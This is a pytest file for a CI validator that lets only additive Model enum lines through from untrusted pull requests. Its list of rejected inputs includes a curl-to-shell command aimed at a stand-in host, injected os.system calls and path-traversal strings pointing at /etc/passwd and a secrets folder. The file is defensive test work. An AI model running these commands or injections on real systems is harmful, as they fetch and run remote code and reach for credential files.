"""Tests for the PR data-overlay validator used by CI model ingestion.

The validator is a security boundary: it must only ever let *additive Model member
lines* through from an untrusted PR's enums.py, since the ingest workflow runs with
FIGSHARE_TOKEN etc. in env on the resulting tree.
"""

import importlib.util
import sys
from pathlib import Path

import pytest

spec = importlib.util.spec_from_file_location(
    "apply_pr_models_overlay",
    Path(__file__).parent.parent / "scripts" / "apply_pr_models_overlay.py",
)
assert spec is not None  # narrow ModuleSpec | None for type checker
assert spec.loader is not None  # narrow Loader | None for type checker
overlay = importlib.util.module_from_spec(spec)
sys.modules["apply_pr_models_overlay"] = overlay
spec.loader.exec_module(overlay)

TRUSTED = '''class Model(Files, base_dir=f"{ROOT}/models"):
    """docstring"""

    chgnet_030 = auto(), "chgnet/chgnet-0.3.0.yml"
    mace_mpa_0 = auto(), "mace/mace-mpa-0.yml"  # trained on MPtrj and Alexandria
'''


def test_identical_is_valid() -> None:
    assert overlay.validate_enums_diff(TRUSTED, TRUSTED) == []


@pytest.mark.parametrize(
    "added_line",
    [
        '    new_model_v1 = auto(), "new-arch/new-model-v1.yml"',
        '    new_model_v1 = auto(), "new-arch/new-model-v1.yml"  # 2026-06 submission',
        # uppercase + dots occur in real YAML paths (eqV2/, chgnet-0.3.0.yml)
        '    eqv3_l_omat = auto(), "eqV2/eqV3-l-omat-1.2.yml"',
        "    # comment lines are harmless",
        "",
    ],
)
def test_additive_member_lines_are_valid(added_line: str) -> None:
    submitted = TRUSTED + added_line + "\n"
    assert overlay.validate_enums_diff(TRUSTED, submitted) == []


@pytest.mark.parametrize(
    "added_line",
    [
        "    import os; os.system('curl evil.sh | sh')",
        '    new_model = auto(), "new/model.yml" or __import__("os").system("id")',
        "    new_model = auto(), exfiltrate()",
        '    evil = auto(), "../../../etc/passwd.yml"',  # path traversal
        '    evil = auto(), "arch/../../secrets/x.yml"',  # embedded traversal
        '    EVIL_NAME = auto(), "arch/model.yml"',  # uppercase member name
        "print('top-level code')",
    ],
)
def test_non_member_additions_are_rejected(added_line: str) -> None:
    submitted = TRUSTED + added_line + "\n"
    assert overlay.validate_enums_diff(TRUSTED, submitted) != []


def test_deleting_or_modifying_existing_lines_is_rejected() -> None:
    deleted = TRUSTED.replace(
        '    chgnet_030 = auto(), "chgnet/chgnet-0.3.0.yml"\n', ""
    )
    assert overlay.validate_enums_diff(TRUSTED, deleted) != []

    # modifications are rejected even when the new line itself looks like a member
    # (an attacker could repoint an existing model at a different YAML)
    modified = TRUSTED.replace("chgnet/chgnet-0.3.0.yml", "chgnet/evil.yml")
    assert overlay.validate_enums_diff(TRUSTED, modified) != []
